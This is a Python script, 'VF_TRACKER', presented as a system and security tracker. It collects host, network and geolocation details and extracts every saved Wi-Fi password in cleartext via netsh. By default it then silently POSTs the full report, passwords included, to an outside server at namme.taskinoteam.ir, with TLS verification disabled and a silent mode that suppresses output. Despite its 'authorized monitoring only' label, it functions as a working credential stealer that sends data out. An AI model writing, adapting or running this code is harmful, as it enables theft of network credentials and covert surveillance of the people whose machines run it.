#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔═══════════════════════════════════════════════════════════════════════════╗
║     VF_TRACKER — System Identity & Security Tracker                     ║
║     Part of the STORM_VX Architecture                                    ║
║                                                                           ║
║  Collects comprehensive system, network, and security information:        ║
║  - System info (OS, CPU, RAM, disk, hostname, uptime)                    ║
║  - Network info (local IP, MAC, gateway, ARP table, connections)         ║
║  - Public IP & geolocation (via ipnumberia.com)                          ║
║  - Security info (firewall status, WiFi passwords)                       ║
║  - Saves everything to VF_TRACKER_REPORT.txt                             ║
║                                                                           ║
║  FOR AUTHORIZED MONITORING ONLY!                                          ║
╚═══════════════════════════════════════════════════════════════════════════╝

Usage:
  python VF_TRACKER.py                           # Auto-run and save to TXT
  python VF_TRACKER.py --output C:/logs/my.txt   # Custom output path
  python VF_TRACKER.py --silent                  # No console output, only file
  python VF_TRACKER.py --server http://namme.taskinoteam.ir/receive.php

Output:
  VF_TRACKER_REPORT.txt in the script's directory (or custom path)
  Data also sent to remote PHP server if --server is specified
"""

import socket
import uuid
import urllib.request
import urllib.parse
import re
import ssl
import platform
import subprocess
import sys
import os
import json
import time
import argparse
from datetime import datetime

IS_WINDOWS = platform.system() == 'Windows'

# ═══════════════════════════════════════════════════════════════════════════════
# SERVER CONFIGURATION — Must match receive.php token!
# ═══════════════════════════════════════════════════════════════════════════════
VF_SECRET_TOKEN = 'STORM_VX_2024_SECURE_TOKEN_CHANGE_ME'
DEFAULT_SERVER_URL = 'http://namme.taskinoteam.ir/receive.php'

# ═══════════════════════════════════════════════════════════════════════════════
# Basic Information Functions
# ═══════════════════════════════════════════════════════════════════════════════

def is_admin():
    try:
        if IS_WINDOWS:
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        else:
            return os.geteuid() == 0
    except Exception:
        return False

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except Exception:
        return "Error"

def get_mac_address():
    mac = uuid.getnode()
    return ":".join([f"{(mac >> elements) & 0xff:02x}" for elements in range(0, 8*6, 8)][::-1])

# ═══════════════════════════════════════════════════════════════════════════════
# System & Hardware Functions
# ═══════════════════════════════════════════════════════════════════════════════

def get_os_info():
    os_name = platform.system()
    os_release = platform.release()
    os_version = platform.version()
    processor = platform.processor()
    arch = platform.machine()
    os_str = f"{os_name} {os_release} ({arch})"
    cpu_str = f"{processor if processor else 'Unknown'}"
    return os_str, cpu_str

def get_system_uptime():
    try:
        if IS_WINDOWS:
            result = subprocess.run(['wmic', 'os', 'get', 'LastBootUpTime'],
                                    capture_output=True, text=True, timeout=5)
            lines = [l.strip() for l in result.stdout.split('\n') if l.strip()]
            if len(lines) > 1:
                boot_time_str = lines[1]
                if boot_time_str:
                    return f"{boot_time_str[0:4]}/{boot_time_str[4:6]}/{boot_time_str[6:8]} - {boot_time_str[8:10]}:{boot_time_str[10:12]}"
        else:
            result = subprocess.run(['uptime', '-s'], capture_output=True, text=True, timeout=5)
            if result.stdout.strip():
                return result.stdout.strip()
        return "Not supported on this OS"
    except Exception:
        return "Error retrieving"

def get_hardware_resources():
    info = {}
    try:
        if IS_WINDOWS:
            # RAM
            mem_cmd = subprocess.run(['wmic', 'OS', 'get', 'TotalVisibleMemorySize,FreePhysicalMemory'],
                                     capture_output=True, text=True, timeout=5)
            mem_lines = [l.strip() for l in mem_cmd.stdout.split('\n')
                         if l.strip() and 'TotalVisible' not in l]
            if mem_lines:
                parts = mem_lines[0].split()
                if len(parts) >= 2:
                    info['RAM'] = f"Total: {int(parts[0])/1024:.1f} GB | Free: {int(parts[1])/1024:.1f} GB"

            # Disk
            disk_cmd = subprocess.run(['wmic', 'logicaldisk', 'get', 'size,freespace,caption'],
                                      capture_output=True, text=True, timeout=5)
            for line in disk_cmd.stdout.split('\n'):
                if 'C:' in line:
                    parts = line.split()
                    if len(parts) >= 3:
                        info['Disk C:'] = f"Total: {int(parts[2])/(1024**3):.1f} GB | Free: {int(parts[1])/(1024**3):.1f} GB"
                        break
        else:
            # Linux RAM
            try:
                with open('/proc/meminfo', 'r') as f:
                    meminfo = {}
                    for line in f:
                        parts = line.split()
                        if len(parts) >= 2:
                            meminfo[parts[0].rstrip(':')] = int(parts[1])
                    total = meminfo.get('MemTotal', 0) / 1024
                    free = meminfo.get('MemAvailable', meminfo.get('MemFree', 0)) / 1024
                    info['RAM'] = f"Total: {total:.1f} GB | Free: {free:.1f} GB"
            except Exception:
                pass
        return info if info else {"Status": "No information found"}
    except Exception:
        return {"Error": "Failed to retrieve hardware info"}

# ═══════════════════════════════════════════════════════════════════════════════
# Network Functions
# ═══════════════════════════════════════════════════════════════════════════════

def get_default_gateway():
    try:
        if IS_WINDOWS:
            result = subprocess.run(['ipconfig'], capture_output=True, text=True,
                                    timeout=5, encoding='utf-8')
            match = re.search(r'Default Gateway\.+:\s*([\d\.]+)', result.stdout)
            return match.group(1) if match else "Not found"
        else:
            result = subprocess.run(['ip', 'route'], capture_output=True, text=True, timeout=5)
            match = re.search(r'default via ([\d\.]+)', result.stdout)
            return match.group(1) if match else "Not found"
    except Exception:
        return "Error"

def get_active_connections():
    try:
        command = 'netstat -ano' if IS_WINDOWS else 'ss -tulpn'
        result = subprocess.run(command, shell=True, capture_output=True, text=True,
                                timeout=5, encoding='utf-8')
        established = [line.strip() for line in result.stdout.split('\n')
                       if 'ESTABLISHED' in line]
        return established[:5]
    except Exception:
        return ["Error retrieving connections"]

def get_arp_table():
    try:
        result = subprocess.run(['arp', '-a'], capture_output=True, text=True,
                                timeout=5, encoding='utf-8')
        devices = [line.strip() for line in result.stdout.split('\n')
                   if re.search(r'\d+\.\d+\.\d+\.\d+', line)]
        return devices[:5]
    except Exception:
        return ["ARP access blocked"]

# ═══════════════════════════════════════════════════════════════════════════════
# Security Functions
# ═══════════════════════════════════════════════════════════════════════════════

def get_firewall_status():
    if not IS_WINDOWS:
        return ["Only supported on Windows"]
    try:
        result = subprocess.run(['netsh', 'advfirewall', 'show', 'allprofiles', 'state'],
                                capture_output=True, text=True, timeout=5, encoding='utf-8')
        profiles = [line.strip() for line in result.stdout.split('\n')
                    if 'ON' in line or 'OFF' in line]
        return profiles if profiles else ["Error retrieving"]
    except Exception:
        return ["Requires Admin access"]

def get_wifi_passwords():
    if not IS_WINDOWS:
        return [("Non-Windows OS", "This feature is only supported on Windows")]
    wifi_list = []
    try:
        profiles_cmd = subprocess.run(['netsh', 'wlan', 'show', 'profiles'],
                                       capture_output=True, text=True, timeout=5,
                                       encoding='utf-8')
        profile_names = re.findall(r':\s+(.+)\s*$', profiles_cmd.stdout, re.MULTILINE)

        for name in profile_names:
            detail_cmd = subprocess.run(['netsh', 'wlan', 'show', 'profile',
                                          f'name={name}', 'key=clear'],
                                         capture_output=True, text=True, timeout=5,
                                         encoding='utf-8')
            password_match = re.search(r'\u0645\u062d\u062a\u0648\u0627\u06cc \u06a9\u0644\u06cc\u062f\s*:\s*(.+)\s*$',
                                       detail_cmd.stdout, re.MULTILINE)
            if not password_match:
                password_match = re.search(r'Key Content\s*:\s*(.+)\s*$',
                                           detail_cmd.stdout, re.MULTILINE)
            password = password_match.group(1) if password_match else "(No access / Open)"
            wifi_list.append((name.strip(), password.strip()))
    except Exception as e:
        return [("Error", str(e))]
    return wifi_list

# ═══════════════════════════════════════════════════════════════════════════════
# Numberia (4-Stage Coordinate System)
# ═══════════════════════════════════════════════════════════════════════════════

def get_info_from_numberia():
    url = "https://ipnumberia.com/"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    req = urllib.request.Request(url, headers=headers)
    ctx = ssl._create_unverified_context()

    public_ip = "Not found"
    isp = "Unknown"
    country = "Unknown"
    city = "Unknown"
    coords = "Unknown"

    try:
        response = urllib.request.urlopen(req, timeout=10, context=ctx)
        html = response.read().decode('utf-8')

        # 1. Find IP
        ip_match = re.search(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', html)
        if ip_match:
            public_ip = ip_match.group(0)

            # 2. Context window
            start = max(0, ip_match.start() - 2000)
            end = min(len(html), ip_match.end() + 2000)
            context_html = html[start:end]
            clean_text = re.sub(r'<[^>]+>', ' ', context_html)
            clean_text = re.sub(r'\s+', ' ', clean_text)

            # Country
            c_match = re.search(r'(?:Country)\s*:?\s*([^\s,<]{2,30})', clean_text, re.IGNORECASE)
            if c_match: country = c_match.group(1)

            # City
            city_match = re.search(r'(?:City|Province)\s*:?\s*([^\s,<]{2,30})', clean_text, re.IGNORECASE)
            if city_match: city = city_match.group(1)

            # ISP
            isp_match = re.search(r'(?:ISP)\s*:?\s*([^\s,<]{2,60})', clean_text, re.IGNORECASE)
            if isp_match:
                isp = isp_match.group(1)
            else:
                isp_keywords = ['Irancell', 'Mokhaberat', 'Shatel', 'Rightel',
                                'Pars Online', 'HiWeb', 'Afranet', 'Iran Cell']
                for kw in isp_keywords:
                    if kw.lower() in clean_text.lower():
                        isp = kw
                        break

            # 4-stage coordinate system
            coord_match = re.search(r'(\d{2,3}\.\d+)\s*[,/]\s*(\d{2,3}\.\d+)', clean_text)
            if not coord_match:
                coord_match = re.search(r'maps.*?[@=q/](\d{2,3}\.\d+)[,\s]+(\d{2,3}\.\d+)',
                                        clean_text, re.IGNORECASE)
            if not coord_match:
                coord_match = re.search(r'(?:lat|lon)[^\d]*(\d{2,3}\.\d+)[^\d]*(\d{2,3}\.\d+)',
                                        clean_text, re.IGNORECASE)
            if not coord_match:
                coord_match = re.search(
                    r'(?:lat|lon|latitude|longitude)["\s:=]+([\d.]+)["\s,]+["\s:=]+([\d.]+)',
                    context_html, re.IGNORECASE)
            if coord_match:
                coords = f"{coord_match.group(1)}, {coord_match.group(2)}"

        return public_ip, isp, country, city, coords

    except Exception as e:
        return public_ip, str(e), "Error", "Error", "Error"

# ═══════════════════════════════════════════════════════════════════════════════
# Report Builder — Saves to TXT
# ═══════════════════════════════════════════════════════════════════════════════

def build_report(output_path: str = None, silent: bool = False):
    """
    Build the full system tracker report and save to TXT file.
    
    Args:
        output_path: Custom path for the TXT file. If None, saves to
                     VF_TRACKER_REPORT.txt in the script's directory.
        silent: If True, suppresses console output (only writes to file).
    
    Returns:
        str: Path to the saved TXT file.
    """
    def log(msg: str):
        """Print to console unless silent mode"""
        if not silent:
            print(msg)

    # Determine output path
    if output_path is None:
        script_dir = os.path.dirname(os.path.abspath(__file__))
        output_path = os.path.join(script_dir, "VF_TRACKER_REPORT.txt")

    # Ensure directory exists
    os.makedirs(os.path.dirname(os.path.abspath(output_path)), exist_ok=True)

    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    admin_status = "YES (Admin)" if is_admin() else "NO (Limited)"

    log(f"\n{'='*65}")
    log(f"  STORM_VX Tracker - Collecting system information...")
    log(f"  Time: {timestamp}")
    log(f"{'='*65}\n")

    # ─── Section 1: System & Hardware ───
    os_info, cpu_info = get_os_info()
    hw_info = get_hardware_resources()
    uptime = get_system_uptime()
    hostname = socket.gethostname()

    # ─── Section 2: Internal Network ───
    local_ip = get_local_ip()
    mac_addr = get_mac_address()
    gateway = get_default_gateway()

    # ─── Section 3: Public Info ───
    log("  Retrieving public IP info from ipnumberia.com ...")
    ip, isp, country, city, coords = get_info_from_numberia()

    # ─── Section 4: Security ───
    firewall = get_firewall_status()
    wifi_networks = get_wifi_passwords()
    connections = get_active_connections()
    arp_devices = get_arp_table()

    # ═══ Build TXT content ═══
    lines = []
    sep = "=" * 65
    sep2 = "-" * 65

    lines.append(sep)
    lines.append(f"  STORM_VX TRACKER REPORT")
    lines.append(f"  Generated: {timestamp}")
    lines.append(f"  Admin Access: {admin_status}")
    lines.append(sep)

    # Section 1: System
    lines.append("")
    lines.append(f"  [SYSTEM] Hostname            : {hostname}")
    lines.append(f"  [SYSTEM] Operating System     : {os_info}")
    lines.append(f"  [SYSTEM] Processor            : {cpu_info}")
    lines.append(f"  [SYSTEM] Last Restart         : {uptime}")
    if 'RAM' in hw_info:
        lines.append(f"  [HARDWARE] RAM                : {hw_info['RAM']}")
    if 'Disk C:' in hw_info:
        lines.append(f"  [HARDWARE] Drive C:           : {hw_info['Disk C:']}")

    # Section 2: Internal Network
    lines.append("")
    lines.append(sep2)
    lines.append(f"  [NETWORK] Local IP            : {local_ip}")
    lines.append(f"  [NETWORK] MAC Address          : {mac_addr}")
    lines.append(f"  [NETWORK] Gateway              : {gateway}")

    # Section 3: Public Info
    lines.append("")
    lines.append(sep2)
    if ip and ip != "Not found":
        lines.append(f"  [INTERNET] Public IP           : {ip}")
        lines.append(f"  [INTERNET] ISP                 : {isp}")
        lines.append(f"  [LOCATION] Country             : {country}")
        lines.append(f"  [LOCATION] City                : {city}")
        lines.append(f"  [LOCATION] Coordinates         : {coords}")
    else:
        lines.append(f"  [ERROR] Internet info retrieval failed.")

    # Section 4: Security
    lines.append("")
    lines.append(sep2)
    lines.append(f"  [SECURITY] Firewall Status:")
    for f in firewall:
        if f: lines.append(f"             - {f}")

    lines.append("")
    lines.append(f"  [SENSITIVE] Saved WiFi Networks & Passwords:")
    for name, passw in wifi_networks:
        lines.append(f"             -> WiFi: {name:<20} | Pass: {passw}")

    lines.append("")
    lines.append(f"  [SENSITIVE] Active Connections (Established):")
    for conn in connections:
        if conn: lines.append(f"             -> {conn}")

    lines.append("")
    lines.append(f"  [SENSITIVE] LAN Devices (ARP Table):")
    for device in arp_devices:
        if device: lines.append(f"             -> {device}")

    lines.append("")
    lines.append(sep)

    report_text = "\n".join(lines)

    # ═══ Write to TXT file ═══
    try:
        with open(output_path, 'w', encoding='utf-8') as f:
            f.write(report_text)
        log(f"\n  [OK] Tracker report saved to: {output_path}")
    except Exception as e:
        log(f"\n  [ERROR] Failed to save tracker report: {e}")
        # Fallback: try Desktop
        try:
            desktop = os.path.join(os.path.expanduser("~"), "Desktop")
            fallback_path = os.path.join(desktop, "VF_TRACKER_REPORT.txt")
            with open(fallback_path, 'w', encoding='utf-8') as f:
                f.write(report_text)
            log(f"  [OK] Fallback saved to: {fallback_path}")
            output_path = fallback_path
        except Exception as e2:
            log(f"  [ERROR] Fallback also failed: {e2}")

    # ═══ Also save as JSON for programmatic use ═══
    json_path = output_path.replace('.txt', '.json')
    try:
        report_data = {
            "timestamp": timestamp,
            "admin": admin_status,
            "hostname": hostname,
            "os": os_info,
            "cpu": cpu_info,
            "uptime": uptime,
            "hardware": hw_info,
            "local_ip": local_ip,
            "mac_address": mac_addr,
            "gateway": gateway,
            "public_ip": ip,
            "isp": isp,
            "country": country,
            "city": city,
            "coordinates": coords,
            "firewall": firewall,
            "wifi_networks": [{"name": n, "password": p} for n, p in wifi_networks],
            "active_connections": connections,
            "arp_devices": arp_devices,
        }
        with open(json_path, 'w', encoding='utf-8') as f:
            json.dump(report_data, f, ensure_ascii=False, indent=2)
        log(f"  [OK] JSON report saved to: {json_path}")
    except Exception as e:
        log(f"  [ERROR] JSON save failed: {e}")

    # Print to console too
    if not silent:
        print(report_text)

    return output_path, report_text, report_data


# ═══════════════════════════════════════════════════════════════════════════════
# Server Sender — POST data to PHP endpoint
# ═══════════════════════════════════════════════════════════════════════════════

def send_to_server(server_url: str, token: str, report_text: str, report_data: dict,
                   silent: bool = False):
    """
    Send the tracker report to the remote PHP server via HTTP POST.
    
    Args:
        server_url: Full URL of the receive.php endpoint
        token: Security token (must match VF_SECRET_TOKEN in receive.php)
        report_text: The TXT report string
        report_data: The JSON report dictionary
        silent: If True, suppress console output
    
    Returns:
        bool: True if sent successfully, False otherwise
    """
    def log(msg: str):
        if not silent:
            print(msg)

    try:
        # Prepare POST data
        post_data = urllib.parse.urlencode({
            'vf_token': token,
            'tracker_data': report_text,
            'tracker_json': json.dumps(report_data, ensure_ascii=False)
        }).encode('utf-8')

        # Create request
        req = urllib.request.Request(server_url, data=post_data, method='POST')
        req.add_header('Content-Type', 'application/x-www-form-urlencoded')
        req.add_header('User-Agent', 'STORM_VX_TRACKER/2.0')

        # Send with SSL context (allow self-signed for flexibility)
        ctx = ssl._create_unverified_context()
        response = urllib.request.urlopen(req, timeout=15, context=ctx)
        response_data = response.read().decode('utf-8')

        # Parse response
        try:
            result = json.loads(response_data)
            if result.get('status') == 'ok':
                log(f"  [OK] Report sent to server: {server_url}")
                log(f"       Saved as: {result.get('file', 'unknown')}")
                return True
            else:
                log(f"  [ERROR] Server rejected: {result.get('message', 'Unknown error')}")
                return False
        except json.JSONDecodeError:
            log(f"  [OK] Server received the data (response: {response_data[:100]})")
            return True

    except urllib.error.HTTPError as e:
        log(f"  [ERROR] Server returned HTTP {e.code}: {e.reason}")
        return False
    except urllib.error.URLError as e:
        log(f"  [ERROR] Cannot reach server: {e.reason}")
        return False
    except Exception as e:
        log(f"  [ERROR] Send failed: {e}")
        return False


# ═══════════════════════════════════════════════════════════════════════════════
# CLI Entry Point
# ═══════════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="VF_TRACKER - System Identity Tracker")
    parser.add_argument("--output", "-o", type=str, default=None,
                        help="Custom output path for the TXT report file")
    parser.add_argument("--silent", "-s", action="store_true",
                        help="Silent mode - only write to file, no console output")
    parser.add_argument("--server", type=str, default=DEFAULT_SERVER_URL,
                        help=f"PHP receiver URL (default: {DEFAULT_SERVER_URL})")
    parser.add_argument("--no-server", action="store_true",
                        help="Skip sending data to server (local only)")
    parser.add_argument("--token", type=str, default=VF_SECRET_TOKEN,
                        help="Security token for server authentication")
    args = parser.parse_args()

    result_path, report_text, report_data = build_report(
        output_path=args.output, silent=args.silent
    )

    # Send to server unless --no-server flag is set
    if not args.no_server and args.server:
        send_to_server(
            server_url=args.server,
            token=args.token,
            report_text=report_text,
            report_data=report_data,
            silent=args.silent
        )
